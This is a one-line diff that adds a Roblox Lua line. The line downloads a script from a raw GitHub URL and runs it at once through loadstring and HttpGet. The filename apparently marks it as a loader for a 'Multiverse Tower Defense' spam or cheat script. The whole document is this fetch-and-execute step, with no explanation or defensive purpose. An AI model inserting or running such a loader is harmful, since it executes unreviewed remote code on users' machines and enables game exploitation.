@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/multiverse-tower-defense-spam3-fm0cue6so797q3.lua"))()
